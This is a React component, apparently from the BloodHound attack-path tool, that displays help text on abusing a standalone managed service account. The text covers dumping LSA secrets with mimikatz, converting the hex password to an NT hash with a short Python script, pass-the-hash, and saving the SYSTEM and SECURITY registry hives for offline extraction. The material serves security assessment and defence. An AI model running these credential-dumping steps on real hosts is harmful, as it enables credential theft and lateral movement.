// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { EdgeInfoProps } from '../index';
import { Typography } from '@mui/material';

const Abuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, targetType }) => {
    return (
        <>
            <Typography variant='body2'>
                From an elevated command prompt on {sourceName}, run mimikatz then execute the following commands:
            </Typography>

            <Typography component={'pre'}>{`privilege::debug
token::elevate
lsadump::secrets`}</Typography>

            <Typography variant='body2'>
                In the output, find{' '}
                <Typography component={'pre'}>
                    _SC_&#123;262E99C9-6160-4871-ACEC-4E61736B6F21&#125;_{targetName?.toLowerCase().split('@')[0]}
                </Typography>
                . The next line contains <Typography component={'pre'}>cur/hex :</Typography> followed with {targetName}
                's password hex-encoded.
            </Typography>

            <Typography variant='body2'>
                To use this password, its NT hash must be calculated. This can be done using a small python script:
            </Typography>

            <Typography component={'pre'}>
                {`# nt.py
import sys, hashlib

pw_hex = sys.argv[1]
nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()

print(nt_hash)`}
            </Typography>

            <Typography variant='body2'>Execute it like so:</Typography>

            <Typography component={'pre'}>python3 nt.py 35f3e1713d61...</Typography>

            <Typography variant='body2'>To authenticate as the sMSA, leverage pass-the-hash.</Typography>

            <Typography variant='body2'>
                Alternatively, to avoid executing mimikatz on {sourceName}, you can save a copy of the{' '}
                <Typography component={'pre'}>SYSTEM</Typography> and{' '}
                <Typography component={'pre'}>SECURITY</Typography> registry hives from an elevated prompt:
            </Typography>

            <Typography component={'pre'}>
                reg save HKLM\SYSTEM %temp%\SYSTEM & reg save HKLM\SECURITY %temp%\SECURITY
            </Typography>

            <Typography variant='body2'>
                Transfer the files named <Typography component={'pre'}>SYSTEM</Typography> and{' '}
                <Typography component={'pre'}>SECURITY</Typography> that were saved at{' '}
                <Typography component={'pre'}>%temp%</Typography> to another computer where mimikatz can be safely
                executed. On this other computer, run mimikatz from a command prompt then execute the following command
                to obtain the hex-encoded password:
            </Typography>

            <Typography component={'pre'}>
                lsadump::secrets /system:C:\path\to\file\SYSTEM /security:C:\path\to\file\SECURITY
            </Typography>
        </>
    );
};

export default Abuse;
